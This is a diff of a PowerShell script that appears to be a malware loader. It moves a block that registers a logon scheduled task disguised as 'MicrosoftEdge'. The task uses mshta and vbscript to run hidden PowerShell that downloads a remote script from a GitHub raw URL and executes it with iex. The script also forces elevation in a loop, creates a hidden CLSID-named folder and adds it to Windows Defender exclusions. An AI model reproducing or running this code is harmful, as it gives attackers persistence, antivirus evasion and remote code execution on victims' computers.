@@ -7,6 +7,12 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     while(1){try{Start-Process -Verb RunAs -FilePath '$env:userprofile\run.cmd';exit}catch{}}
 }
 
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$skid='$skid';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
+$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+$task_name = "MicrosoftEdge"
+$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Microsoft Edge" -RunLevel Highest -Force | Out-Null
+
 $rdir = "$env:userprofile\150F4013"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 New-Item -ItemType Directory -Path $dir
@@ -21,11 +27,7 @@ New-Item -ItemType Directory -Path $temp
 
 Add-MpPreference -ExclusionPath $dir
 
-$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$skid='$skid';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
-$task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_name = "MicrosoftEdge"
-$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Microsoft Edge" -RunLevel Highest -Force | Out-Null
+
 
 
 
